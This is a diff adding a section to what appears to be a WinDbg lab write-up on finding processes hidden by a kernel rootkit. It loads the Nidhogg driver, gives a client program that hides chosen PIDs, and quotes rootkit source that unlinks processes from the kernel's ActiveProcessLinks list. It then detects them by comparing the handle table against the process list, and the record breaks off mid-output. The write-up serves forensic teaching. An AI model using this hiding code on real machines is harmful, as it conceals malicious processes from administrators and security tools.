@@ -682,3 +682,537 @@ The function at 46D910 corresponds to crypto_aes_NewCipher, whose sole parameter
 000000c0`00065488  92 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
 000000c0`00065498  00 00 00 00 00 00 00 00-20 55 06 00 c0 00 00 00  ........ U......
 ```
+### Challenge: FIND THE PROCESS HIDDEN by HideMe rootkit
+Problem to solve: How does a kernel rootkit conceal PIDs, and how can they be found using windbg?
+
+Use [Nidhogg-Alpha](https://github.com/Idov31/Nidhogg/tree/Alpha) instead of HideMe.sys driver which doesn't work in my Win10 lab. The principle of PID hiding is the same.
+
+#### run Nidhogg rootkit
+```
+sc create Nidhogg type=kernel binpath=C:\test\Nidhogg
+sc start Nidhogg
+sc query Nidhogg
+```
+in windbg
+```asm
+0: kd> lm m Nidhogg
+Browse full module list
+start             end                 module name
+fffff801`2fac0000 fffff801`2fac7000   Nidhogg    (deferred)
+
+0: kd> !drvobj \Driver\Nidhogg
+Driver object (ffffe089821e4b90) is for:
+ \Driver\Nidhogg
+
+Driver Extension List: (id , addr)
+
+Device Object list:
+ffffe08983d56e10  
+
+0: kd> !devobj ffffe08983d56e10
+Device object (ffffe08983d56e10) is for:
+ Nidhogg \Driver\Nidhogg DriverObject ffffe089821e4b90
+Current Irp 00000000 RefCount 0 Type 00000022 Flags 00000040
+SecurityDescriptor ffff9706ed2f3520 DevExt 00000000 DevObjExt ffffe08983d56f60 
+ExtensionFlags (0x00000800)  DOE_DEFAULT_SD_PRESENT
+Characteristics (0000000000)  
+Device queue is not busy.
+
+0: kd> !drvobj \Driver\Nidhogg 2
+Driver object (ffffe089821e4b90) is for:
+ \Driver\Nidhogg
+
+DriverEntry:   fffff8012fac5000	Nidhogg!GsDriverEntry
+DriverStartIo: 00000000	
+DriverUnload:  fffff8012fac1590	Nidhogg!NidhoggUnload
+AddDevice:     00000000	
+
+Dispatch routines:
+[00] IRP_MJ_CREATE                      fffff8012fac1300	Nidhogg!NidhoggCreateClose
+[01] IRP_MJ_CREATE_NAMED_PIPE           fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[02] IRP_MJ_CLOSE                       fffff8012fac1300	Nidhogg!NidhoggCreateClose
+[03] IRP_MJ_READ                        fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[04] IRP_MJ_WRITE                       fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[05] IRP_MJ_QUERY_INFORMATION           fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[06] IRP_MJ_SET_INFORMATION             fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[07] IRP_MJ_QUERY_EA                    fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[08] IRP_MJ_SET_EA                      fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[09] IRP_MJ_FLUSH_BUFFERS               fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[0b] IRP_MJ_SET_VOLUME_INFORMATION      fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[0c] IRP_MJ_DIRECTORY_CONTROL           fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[0d] IRP_MJ_FILE_SYSTEM_CONTROL         fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[0e] IRP_MJ_DEVICE_CONTROL              fffff8012fac1320	Nidhogg!NidhoggDeviceControl
+[0f] IRP_MJ_INTERNAL_DEVICE_CONTROL     fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[10] IRP_MJ_SHUTDOWN                    fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[11] IRP_MJ_LOCK_CONTROL                fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[12] IRP_MJ_CLEANUP                     fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[13] IRP_MJ_CREATE_MAILSLOT             fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[14] IRP_MJ_QUERY_SECURITY              fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[15] IRP_MJ_SET_SECURITY                fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[16] IRP_MJ_POWER                       fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[17] IRP_MJ_SYSTEM_CONTROL              fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[18] IRP_MJ_DEVICE_CHANGE               fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[19] IRP_MJ_QUERY_QUOTA                 fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[1a] IRP_MJ_SET_QUOTA                   fffff8012ab0be00	nt!IopInvalidDeviceRequest
+[1b] IRP_MJ_PNP                         fffff8012ab0be00	nt!IopInvalidDeviceRequest
+```
+
+#### run NidhoggClient.cpp
+```cpp
+#include "Nidhogg.hpp"
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <iostream>
+
+int main(int argc, char* argv[]) {
+
+    if (argc < 2) {
+        std::cerr << "Usage: " << argv[0] << " <PID1> [PID2] [PID3] ...\n";
+        std::cerr << "Example: " << argv[0] << " 1234 5678\n";
+        return 1;
+    }
+
+    std::vector<DWORD> pids;
+    for (int i = 1; i < argc; i++) {
+        DWORD pid = strtoul(argv[i], nullptr, 10);
+        if (pid == 0 || pid <= 4) {
+            std::cerr << "Invalid PID: " << argv[i] << "\n";
+            return 1;
+        }
+        pids.push_back(pid);
+    }
+
+    DWORD result = NidhoggProcessHide(pids);
+
+    if (result == 0) {
+        std::cout << "Successfully hidden processes\n";
+        return 0;
+    }
+    if (result == NIDHOGG_ERROR_CONNECT_DRIVER) {
+        std::cerr << "Failed to connect to driver\n";
+    }
+    else {
+        std::cerr << "Driver communication failed\n";
+    }
+    return result;
+}
+```
+Open two files with Notepad. Check their PIDs are 3432 and 4776 respectively in Task Manager. Execute NidhoggClient to hide PID 3432, then verify the status of processes 3432 and 4776.
+```asm
+0: kd> dx -r1 @$cursession.Processes[3432].KernelObject
+Error: The operation attempted to access data outside the valid range (0x8000000b)
+
+0: kd> dx -r1 @$cursession.Processes[4776].KernelObject
+@$cursession.Processes[4776]                 : notepad.exe [Switch To]
+    KernelObject     [Type: _EPROCESS]
+    Name             : notepad.exe
+    Id               : 0x12a8
+    Index            : 0x0
+    Handle           : 0xf0f0f0f0
+    Threads         
+    Modules         
+    Environment     
+    Attributes      
+    Devices         
+    Io              
+    GroupedStacks
+
+0: kd> dx -id 0,0,ffffe0897e0a1080 -r1 (*((ntkrnlmp!_EPROCESS *)0xffffe0897e0a1080))
+    [+0x000] Pcb              [Type: _KPROCESS]
+    [+0x438] ProcessLock      [Type: _EX_PUSH_LOCK]
+    [+0x440] UniqueProcessId  : 0x12a8 [Type: void *]
+    [+0x448] ActiveProcessLinks [Type: _LIST_ENTRY]
+    [+0x458] RundownProtect   [Type: _EX_RUNDOWN_REF]
+    [+0x460] Flags2           : 0xd000 [Type: unsigned long]
+    [+0x460 ( 0: 0)] JobNotReallyActive : 0x0 [Type: unsigned long]
+    [+0x460 ( 1: 1)] AccountingFolded : 0x0 [Type: unsigned long]
+    [+0x460 ( 2: 2)] NewProcessReported : 0x0 [Type: unsigned long]
+    [+0x460 ( 3: 3)] ExitProcessReported : 0x0 [Type: unsigned long]
+    [+0x460 ( 4: 4)] ReportCommitChanges : 0x0 [Type: unsigned long]
+    [+0x460 ( 5: 5)] LastReportMemory : 0x0 [Type: unsigned long]
+    [+0x460 ( 6: 6)] ForceWakeCharge  : 0x0 [Type: unsigned long]
+    [+0x460 ( 7: 7)] CrossSessionCreate : 0x0 [Type: unsigned long]
+    [+0x460 ( 8: 8)] NeedsHandleRundown : 0x0 [Type: unsigned long]
+    [+0x460 ( 9: 9)] RefTraceEnabled  : 0x0 [Type: unsigned long]
+    [+0x460 (10:10)] PicoCreated      : 0x0 [Type: unsigned long]
+    [+0x460 (11:11)] EmptyJobEvaluated : 0x0 [Type: unsigned long]
+    [+0x460 (14:12)] DefaultPagePriority : 0x5 [Type: unsigned long]
+    [+0x460 (15:15)] PrimaryTokenFrozen : 0x1 [Type: unsigned long]
+    [+0x460 (16:16)] ProcessVerifierTarget : 0x0 [Type: unsigned long]
+    [+0x460 (17:17)] RestrictSetThreadContext : 0x0 [Type: unsigned long]
+    [+0x460 (18:18)] AffinityPermanent : 0x0 [Type: unsigned long]
+    [+0x460 (19:19)] AffinityUpdateEnable : 0x0 [Type: unsigned long]
+    [+0x460 (20:20)] PropagateNode    : 0x0 [Type: unsigned long]
+    [+0x460 (21:21)] ExplicitAffinity : 0x0 [Type: unsigned long]
+    [+0x460 (23:22)] ProcessExecutionState : 0x0 [Type: unsigned long]
+    [+0x460 (24:24)] EnableReadVmLogging : 0x0 [Type: unsigned long]
+    [+0x460 (25:25)] EnableWriteVmLogging : 0x0 [Type: unsigned long]
+    [+0x460 (26:26)] FatalAccessTerminationRequested : 0x0 [Type: unsigned long]
+    [+0x460 (27:27)] DisableSystemAllowedCpuSet : 0x0 [Type: unsigned long]
+    [+0x460 (29:28)] ProcessStateChangeRequest : 0x0 [Type: unsigned long]
+    [+0x460 (30:30)] ProcessStateChangeInProgress : 0x0 [Type: unsigned long]
+    [+0x460 (31:31)] InPrivate        : 0x0 [Type: unsigned long]
+    [+0x464] Flags            : 0x144d0c01 [Type: unsigned long]
+    [+0x464 ( 0: 0)] CreateReported   : 0x1 [Type: unsigned long]
+    [+0x464 ( 1: 1)] NoDebugInherit   : 0x0 [Type: unsigned long]
+    [+0x464 ( 2: 2)] ProcessExiting   : 0x0 [Type: unsigned long]
+    [+0x464 ( 3: 3)] ProcessDelete    : 0x0 [Type: unsigned long]
+    [+0x464 ( 4: 4)] ManageExecutableMemoryWrites : 0x0 [Type: unsigned long]
+    [+0x464 ( 5: 5)] VmDeleted        : 0x0 [Type: unsigned long]
+    [+0x464 ( 6: 6)] OutswapEnabled   : 0x0 [Type: unsigned long]
+    [+0x464 ( 7: 7)] Outswapped       : 0x0 [Type: unsigned long]
+    [+0x464 ( 8: 8)] FailFastOnCommitFail : 0x0 [Type: unsigned long]
+    [+0x464 ( 9: 9)] Wow64VaSpace4Gb  : 0x0 [Type: unsigned long]
+    [+0x464 (11:10)] AddressSpaceInitialized : 0x3 [Type: unsigned long]
+    [+0x464 (12:12)] SetTimerResolution : 0x0 [Type: unsigned long]
+    [+0x464 (13:13)] BreakOnTermination : 0x0 [Type: unsigned long]
+    [+0x464 (14:14)] DeprioritizeViews : 0x0 [Type: unsigned long]
+    [+0x464 (15:15)] WriteWatch       : 0x0 [Type: unsigned long]
+    [+0x464 (16:16)] ProcessInSession : 0x1 [Type: unsigned long]
+    [+0x464 (17:17)] OverrideAddressSpace : 0x0 [Type: unsigned long]
+    [+0x464 (18:18)] HasAddressSpace  : 0x1 [Type: unsigned long]
+    [+0x464 (19:19)] LaunchPrefetched : 0x1 [Type: unsigned long]
+    [+0x464 (20:20)] Background       : 0x0 [Type: unsigned long]
+    [+0x464 (21:21)] VmTopDown        : 0x0 [Type: unsigned long]
+    [+0x464 (22:22)] ImageNotifyDone  : 0x1 [Type: unsigned long]
+    [+0x464 (23:23)] PdeUpdateNeeded  : 0x0 [Type: unsigned long]
+    [+0x464 (24:24)] VdmAllowed       : 0x0 [Type: unsigned long]
+    [+0x464 (25:25)] ProcessRundown   : 0x0 [Type: unsigned long]
+    [+0x464 (26:26)] ProcessInserted  : 0x1 [Type: unsigned long]
+    [+0x464 (29:27)] DefaultIoPriority : 0x2 [Type: unsigned long]
+    [+0x464 (30:30)] ProcessSelfDelete : 0x0 [Type: unsigned long]
+    [+0x464 (31:31)] SetTimerResolutionLink : 0x0 [Type: unsigned long]
+    [+0x468] CreateTime       : {133960160031264255} [Type: _LARGE_INTEGER]
+    [+0x470] ProcessQuotaUsage [Type: unsigned __int64 [2]]
+    [+0x480] ProcessQuotaPeak [Type: unsigned __int64 [2]]
+    [+0x490] PeakVirtualSize  : 0x2010a4d2000 [Type: unsigned __int64]
+    [+0x498] VirtualSize      : 0x20109e56000 [Type: unsigned __int64]
+    [+0x4a0] SessionProcessLinks [Type: _LIST_ENTRY]
+    [+0x4b0] ExceptionPortData : 0xffffe089800dd360 [Type: void *]
+    [+0x4b0] ExceptionPortValue : 0xffffe089800dd360 [Type: unsigned __int64]
+    [+0x4b0 ( 2: 0)] ExceptionPortState : 0x0 [Type: unsigned __int64]
+    [+0x4b8] Token            [Type: _EX_FAST_REF]
+    [+0x4c0] MmReserved       : 0x0 [Type: unsigned __int64]
+    [+0x4c8] AddressCreationLock [Type: _EX_PUSH_LOCK]
+    [+0x4d0] PageTableCommitmentLock [Type: _EX_PUSH_LOCK]
+    [+0x4d8] RotateInProgress : 0x0 [Type: _ETHREAD *]
+    [+0x4e0] ForkInProgress   : 0x0 [Type: _ETHREAD *]
+    [+0x4e8] CommitChargeJob  : 0x0 [Type: _EJOB *]
+    [+0x4f0] CloneRoot        [Type: _RTL_AVL_TREE]
+    [+0x4f8] NumberOfPrivatePages : 0x23a [Type: unsigned __int64]
+    [+0x500] NumberOfLockedPages : 0x0 [Type: unsigned __int64]
+    [+0x508] Win32Process     : 0xfffff32e06ed88a0 [Type: void *]
+    [+0x510] Job              : 0x0 [Type: _EJOB *]
+    [+0x518] SectionObject    : 0xffff9706f33c4b50 [Type: void *]
+    [+0x520] SectionBaseAddress : 0x7ff6dc060000 [Type: void *]
+    [+0x528] Cookie           : 0x8ebfb1dc [Type: unsigned long]
+    [+0x530] WorkingSetWatch  : 0x0 [Type: _PAGEFAULT_HISTORY *]
+    [+0x538] Win32WindowStation : 0xa4 [Type: void *]
+    [+0x540] InheritedFromUniqueProcessId : 0xe88 [Type: void *]
+    [+0x548] OwnerProcessId   : 0xe8a [Type: unsigned __int64]
+    [+0x550] Peb              : 0x2db8ae3000 [Type: _PEB *]
+    [+0x558] Session          : 0xffff8681b0011000 [Type: _MM_SESSION_SPACE *]
+    [+0x560] Spare1           : 0x0 [Type: void *]
+    [+0x568] QuotaBlock       : 0xffffe08980582800 [Type: _EPROCESS_QUOTA_BLOCK *]
+    [+0x570] ObjectTable      : 0xffff9706f58c4180 [Type: _HANDLE_TABLE *]
+    [+0x578] DebugPort        : 0x0 [Type: void *]
+    [+0x580] WoW64Process     : 0x0 [Type: _EWOW64PROCESS *]
+    [+0x588] DeviceMap        : 0xffff9706f1ed0990 [Type: void *]
+    [+0x590] EtwDataSource    : 0xffffe08982c242d0 [Type: void *]
+    [+0x598] PageDirectoryPte : 0x0 [Type: unsigned __int64]
+    [+0x5a0] ImageFilePointer : 0xffffe08985cab2e0 : "\Windows\System32\notepad.exe" - Device for "\FileSystem\Ntfs" [Type: _FILE_OBJECT *]
+    [+0x5a8] ImageFileName    [Type: unsigned char [15]]
+    [+0x5b7] PriorityClass    : 0x2 [Type: unsigned char]
+    [+0x5b8] SecurityPort     : 0x0 [Type: void *]
+    [+0x5c0] SeAuditProcessCreationInfo [Type: _SE_AUDIT_PROCESS_CREATION_INFO]
+    [+0x5c8] JobLinks         [Type: _LIST_ENTRY]
+    [+0x5d8] HighestUserAddress : 0x7fffffff0000 [Type: void *]
+    [+0x5e0] ThreadListHead   [Type: _LIST_ENTRY]
+    [+0x5f0] ActiveThreads    : 0x1 [Type: unsigned long]
+    [+0x5f4] ImagePathHash    : 0xc5670914 [Type: unsigned long]
+    [+0x5f8] DefaultHardErrorProcessing : 0x1 [Type: unsigned long]
+    [+0x5fc] LastThreadExitStatus : 0 [Type: long]
+    [+0x600] PrefetchTrace    [Type: _EX_FAST_REF]
+    [+0x608] LockedPagesList  : 0x0 [Type: void *]
+    [+0x610] ReadOperationCount : {0} [Type: _LARGE_INTEGER]
+    [+0x618] WriteOperationCount : {0} [Type: _LARGE_INTEGER]
+    [+0x620] OtherOperationCount : {90} [Type: _LARGE_INTEGER]
+    [+0x628] ReadTransferCount : {0} [Type: _LARGE_INTEGER]
+    [+0x630] WriteTransferCount : {0} [Type: _LARGE_INTEGER]
+    [+0x638] OtherTransferCount : {1758} [Type: _LARGE_INTEGER]
+    [+0x640] CommitChargeLimit : 0x0 [Type: unsigned __int64]
+    [+0x648] CommitCharge     : 0x302 [Type: unsigned __int64]
+    [+0x650] CommitChargePeak : 0x36f [Type: unsigned __int64]
+    [+0x680] Vm               [Type: _MMSUPPORT_FULL]
+    [+0x7c0] MmProcessLinks   [Type: _LIST_ENTRY]
+    [+0x7d0] ModifiedPageCount : 0xa7f [Type: unsigned long]
+    [+0x7d4] ExitStatus       : 259 [Type: long]
+    [+0x7d8] VadRoot          [Type: _RTL_AVL_TREE]
+    [+0x7e0] VadHint          : 0xffffe0898740a5a0 [Type: void *]
+    [+0x7e8] VadCount         : 0x6d [Type: unsigned __int64]
+    [+0x7f0] VadPhysicalPages : 0x0 [Type: unsigned __int64]
+    [+0x7f8] VadPhysicalPagesLimit : 0x0 [Type: unsigned __int64]
+    [+0x800] AlpcContext      [Type: _ALPC_PROCESS_CONTEXT]
+    [+0x820] TimerResolutionLink [Type: _LIST_ENTRY]
+    [+0x830] TimerResolutionStackRecord : 0x0 [Type: _PO_DIAG_STACK_RECORD *]
+    [+0x838] RequestedTimerResolution : 0x0 [Type: unsigned long]
+    [+0x83c] SmallestTimerResolution : 0x0 [Type: unsigned long]
+    [+0x840] ExitTime         : {0} [Type: _LARGE_INTEGER]
+    [+0x848] InvertedFunctionTable : 0x0 [Type: _INVERTED_FUNCTION_TABLE *]
+    [+0x850] InvertedFunctionTableLock [Type: _EX_PUSH_LOCK]
+    [+0x858] ActiveThreadsHighWatermark : 0x6 [Type: unsigned long]
+    [+0x85c] LargePrivateVadCount : 0x0 [Type: unsigned long]
+    [+0x860] ThreadListLock   [Type: _EX_PUSH_LOCK]
+    [+0x868] WnfContext       : 0xffff9706f50b1260 [Type: void *]
+    [+0x870] ServerSilo       : 0x0 [Type: _EJOB *]
+    [+0x878] SignatureLevel   : 0x0 [Type: unsigned char]
+    [+0x879] SectionSignatureLevel : 0x0 [Type: unsigned char]
+    [+0x87a] Protection       [Type: _PS_PROTECTION]
+    [+0x87b ( 2: 0)] HangCount        : 0x0 [Type: unsigned char]
+    [+0x87b ( 5: 3)] GhostCount       : 0x0 [Type: unsigned char]
+    [+0x87b ( 6: 6)] PrefilterException : 0x0 [Type: unsigned char]
+    [+0x87c] Flags3           : 0x40c000 [Type: unsigned long]
+    [+0x87c ( 0: 0)] Minimal          : 0x0 [Type: unsigned long]
+    [+0x87c ( 1: 1)] ReplacingPageRoot : 0x0 [Type: unsigned long]
+    [+0x87c ( 2: 2)] Crashed          : 0x0 [Type: unsigned long]
+    [+0x87c ( 3: 3)] JobVadsAreTracked : 0x0 [Type: unsigned long]
+    [+0x87c ( 4: 4)] VadTrackingDisabled : 0x0 [Type: unsigned long]
+    [+0x87c ( 5: 5)] AuxiliaryProcess : 0x0 [Type: unsigned long]
+    [+0x87c ( 6: 6)] SubsystemProcess : 0x0 [Type: unsigned long]
+    [+0x87c ( 7: 7)] IndirectCpuSets  : 0x0 [Type: unsigned long]
+    [+0x87c ( 8: 8)] RelinquishedCommit : 0x0 [Type: unsigned long]
+    [+0x87c ( 9: 9)] HighGraphicsPriority : 0x0 [Type: unsigned long]
+    [+0x87c (10:10)] CommitFailLogged : 0x0 [Type: unsigned long]
+    [+0x87c (11:11)] ReserveFailLogged : 0x0 [Type: unsigned long]
+    [+0x87c (12:12)] SystemProcess    : 0x0 [Type: unsigned long]
+    [+0x87c (13:13)] HideImageBaseAddresses : 0x0 [Type: unsigned long]
+    [+0x87c (14:14)] AddressPolicyFrozen : 0x1 [Type: unsigned long]
+    [+0x87c (15:15)] ProcessFirstResume : 0x1 [Type: unsigned long]
+    [+0x87c (16:16)] ForegroundExternal : 0x0 [Type: unsigned long]
+    [+0x87c (17:17)] ForegroundSystem : 0x0 [Type: unsigned long]
+    [+0x87c (18:18)] HighMemoryPriority : 0x0 [Type: unsigned long]
+    [+0x87c (19:19)] EnableProcessSuspendResumeLogging : 0x0 [Type: unsigned long]
+    [+0x87c (20:20)] EnableThreadSuspendResumeLogging : 0x0 [Type: unsigned long]
+    [+0x87c (21:21)] SecurityDomainChanged : 0x0 [Type: unsigned long]
+    [+0x87c (22:22)] SecurityFreezeComplete : 0x1 [Type: unsigned long]
+    [+0x87c (23:23)] VmProcessorHost  : 0x0 [Type: unsigned long]
+    [+0x87c (24:24)] VmProcessorHostTransition : 0x0 [Type: unsigned long]
+    [+0x87c (25:25)] AltSyscall       : 0x0 [Type: unsigned long]
+    [+0x87c (26:26)] TimerResolutionIgnore : 0x0 [Type: unsigned long]
+    [+0x87c (27:27)] DisallowUserTerminate : 0x0 [Type: unsigned long]
+    [+0x880] DeviceAsid       : 0 [Type: long]
+    [+0x888] SvmData          : 0x0 [Type: void *]
+    [+0x890] SvmProcessLock   [Type: _EX_PUSH_LOCK]
+    [+0x898] SvmLock          : 0x0 [Type: unsigned __int64]
+    [+0x8a0] SvmProcessDeviceListHead [Type: _LIST_ENTRY]
+    [+0x8b0] LastFreezeInterruptTime : 0x0 [Type: unsigned __int64]
+    [+0x8b8] DiskCounters     : 0xffffe0897e0a1ac0 [Type: _PROCESS_DISK_COUNTERS *]
+    [+0x8c0] PicoContext      : 0x0 [Type: void *]
+    [+0x8c8] EnclaveTable     : 0x0 [Type: void *]
+    [+0x8d0] EnclaveNumber    : 0x0 [Type: unsigned __int64]
+    [+0x8d8] EnclaveLock      [Type: _EX_PUSH_LOCK]
+    [+0x8e0] HighPriorityFaultsAllowed : 0x0 [Type: unsigned long]
+    [+0x8e8] EnergyContext    : 0xffffe0897e0a1ae8 [Type: _PO_PROCESS_ENERGY_CONTEXT *]
+    [+0x8f0] VmContext        : 0x0 [Type: void *]
+    [+0x8f8] SequenceNumber   : 0x2ec [Type: unsigned __int64]
+    [+0x900] CreateInterruptTime : 0x4e28e93a6 [Type: unsigned __int64]
+    [+0x908] CreateUnbiasedInterruptTime : 0x4e28e93a6 [Type: unsigned __int64]
+    [+0x910] TotalUnbiasedFrozenTime : 0x0 [Type: unsigned __int64]
+    [+0x918] LastAppStateUpdateTime : 0x9abf98852 [Type: unsigned __int64]
+    [+0x920 (60: 0)] LastAppStateUptime : 0x4c96af4ac [Type: unsigned __int64]
+    [+0x920 (63:61)] LastAppState     : 0x5 [Type: unsigned __int64]
+    [+0x928] SharedCommitCharge : 0x5ac [Type: unsigned __int64]
+    [+0x930] SharedCommitLock [Type: _EX_PUSH_LOCK]
+    [+0x938] SharedCommitLinks [Type: _LIST_ENTRY]
+    [+0x948] AllowedCpuSets   : 0x0 [Type: unsigned __int64]
+    [+0x950] DefaultCpuSets   : 0x0 [Type: unsigned __int64]
+    [+0x948] AllowedCpuSetsIndirect : 0x0 [Type: unsigned __int64 *]
+    [+0x950] DefaultCpuSetsIndirect : 0x0 [Type: unsigned __int64 *]
+    [+0x958] DiskIoAttribution : 0x0 [Type: void *]
+    [+0x960] DxgProcess       : 0xffff9706f7b43de0 [Type: void *]
+    [+0x968] Win32KFilterSet  : 0x0 [Type: unsigned long]
+    [+0x970] ProcessTimerDelay [Type: _PS_INTERLOCKED_TIMER_DELAY_VALUES]
+    [+0x978] KTimerSets       : 0x0 [Type: unsigned long]
+    [+0x97c] KTimer2Sets      : 0x0 [Type: unsigned long]
+    [+0x980] ThreadTimerSets  : 0x8 [Type: unsigned long]
+    [+0x988] VirtualTimerListLock : 0x0 [Type: unsigned __int64]
+    [+0x990] VirtualTimerListHead [Type: _LIST_ENTRY]
+    [+0x9a0] WakeChannel      [Type: _WNF_STATE_NAME]
+    [+0x9a0] WakeInfo         [Type: _PS_PROCESS_WAKE_INFORMATION]
+    [+0x9d0] MitigationFlags  : 0x21 [Type: unsigned long]
+    [+0x9d0] MitigationFlagsValues [Type: <anonymous-tag>]
+    [+0x9d4] MitigationFlags2 : 0x40000000 [Type: unsigned long]
+    [+0x9d4] MitigationFlags2Values [Type: <anonymous-tag>]
+    [+0x9d8] PartitionObject  : 0xffffe0897dec00a0 [Type: void *]
+    [+0x9e0] SecurityDomain   : 0x10000002d [Type: unsigned __int64]
+    [+0x9e8] ParentSecurityDomain : 0x10000002d [Type: unsigned __int64]
+    [+0x9f0] CoverageSamplerContext : 0x0 [Type: void *]
+    [+0x9f8] MmHotPatchContext : 0x0 [Type: void *]
+    [+0xa00] DynamicEHContinuationTargetsTree [Type: _RTL_AVL_TREE]
+    [+0xa08] DynamicEHContinuationTargetsLock [Type: _EX_PUSH_LOCK]
+    [+0xa10] DynamicEnforcedCetCompatibleRanges [Type: _PS_DYNAMIC_ENFORCED_ADDRESS_RANGES]
+```
+#### Examine the Nidhogg-related source code
+```cpp
+VOID RemoveProcessLinks(PLIST_ENTRY current) {
+	PLIST_ENTRY previous, next;
+
+	/*
+	* Changing the list from:
+	* Prev <--> Current <--> Next
+	* 
+	* To:
+	* 
+	*   | ----------------------------------
+	*   v										|
+	* Prev        Current            Next
+	*   |									   ^
+	*   ---------------------------------- |
+	*/ 
+
+	previous = (current->Blink);
+	next = (current->Flink);
+
+	previous->Flink = next;
+	next->Blink = previous;
+
+	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
+	current->Blink = (PLIST_ENTRY)&current->Flink;
+	current->Flink = (PLIST_ENTRY)&current->Flink;
+}
+
+NTSTATUS HideProcess(ULONG pid) {
+	// Getting the offset depending on the OS version.
+	ULONG pidOffset = GetActiveProcessLinksOffset();
+
+	if (pidOffset == STATUS_UNSUCCESSFUL) {
+		return STATUS_UNSUCCESSFUL;
+	}
+	
+	// Enumerating the EPROCESSes and finding the target pid.
+	PEPROCESS currentEProcess = PsGetCurrentProcess();
+	PUINT32 currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
+	
+	ULONG listOffset = pidOffset + sizeof(INT_PTR);	
+	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
+	
+	if (*(UINT32*)currentPid == pid) {
+		RemoveProcessLinks(currentList);
+		return STATUS_SUCCESS;
+	}
+
+	PEPROCESS StartProcess = currentEProcess;
+
+	currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
+	currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
+	currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
+
+	while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentEProcess)
+	{
+		if (*(UINT32*)currentPid == pid) {
+			RemoveProcessLinks(currentList);
+			return STATUS_SUCCESS;
+		}
+
+		currentEProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - listOffset);
+		currentPid = (PUINT32)((ULONG_PTR)currentEProcess + pidOffset);
+		currentList = (PLIST_ENTRY)((ULONG_PTR)currentEProcess + listOffset);
+	}
+
+	return STATUS_SUCCESS;
+}
+```
+Conclusion: The principle by which a rootkit hides processes involves manipulating the Windows kernel's ActiveProcessLinks structure, specifically unlinking the target process's node from the linked list and redirecting its pointers to reference itself.
+
+#### Find hidden PIDs via `!handle`
+Enumerate all active processes and save their `_EPROCESS` addresses to ps.txt
+```asm
+0: kd> !process 0 0
+**** NT ACTIVE PROCESS DUMP ****
+PROCESS ffffe0897de77040
+    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
+    DirBase: 001ad002  ObjectTable: ffff9706ed297f00  HandleCount: 2951.
+    Image: System
+
+PROCESS ffffe0897df06080
+    SessionId: none  Cid: 005c    Peb: 00000000  ParentCid: 0004
+    DirBase: 31346002  ObjectTable: ffff9706ed23aa80  HandleCount:   0.
+    Image: Registry
+
+PROCESS ffffe0898014e040
+    SessionId: none  Cid: 0154    Peb: 8b61f79000  ParentCid: 0004
+    DirBase: 7706c002  ObjectTable: ffff9706ed9d7280  HandleCount:  53.
+    Image: smss.exe
+......
+```
+Enumerate all process handles
+```asm
+0: kd>  !handle 0 0 0 Process
+
+**** NT ACTIVE PROCESS HANDLE DUMP ****
+
+Searching for handles of type Process
+
+PROCESS ffffe0897de77040
+    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
+    DirBase: 001ad002  ObjectTable: ffff9706ed297f00  HandleCount: 2951.
+    Image: System
+
+Kernel handle table at ffff9706ed297f00 with 2951 entries in use
+
+0004: Object: ffffe0897de77040  GrantedAccess: 001fffff (Protected)
+0050: Object: ffffe0897df06080  GrantedAccess: 001fffff (Protected) (Audit)
+......
+0d68: Object: ffffe08981a772c0  GrantedAccess: 0000102a (Protected)
+0d74: Object: ffffe08981a772c0  GrantedAccess: 001fffff (Protected)
+0d78: Object: ffffe08981a772c0  GrantedAccess: 0000102a (Protected)
+0d7c: Object: ffffe08981757200  GrantedAccess: 0000102a (Protected) (Audit)
+0d80: Object: ffffe089818182c0  GrantedAccess: 0000102a (Protected)
+......
+
+0: kd> !process ffffe089818182c0 0
+PROCESS ffffe089818182c0
+    SessionId: 0  Cid: 04a8    Peb: e993731000  ParentCid: 02a4
+    DirBase: 204c0002  ObjectTable: ffff9706f101acc0  HandleCount: 1107.
+    Image: svchost.exe
+```
+Save the results to handles.txt, filter out all process addresses into addresses.txt, deduplicate using `Get-Content addresses.txt | Sort-Object -Unique > uni.txt`, then compare uni.txt with ps.txt - any extra entries indicate hidden processes.
+
+Confirm it in windbg.
+```asm
+0: kd> .foreach /f ( addr "c:\Users\user\Documents\uni.txt" ) { dt _EPROCESS ${addr} ImageFileName UniqueProcessId }
+......
+nt!_EPROCESS
+   +0x440 UniqueProcessId : 0x00000000`00000040 Void
+   +0x5a8 ImageFileName   : [15]  "svchost.exe"
+nt!_EPROCESS
+   +0x440 UniqueProcessId : 0x00000000`000012a8 Void
+   +0x5a8 ImageFileName   : [15]  "notepad.exe"
+nt!_EPROCESS
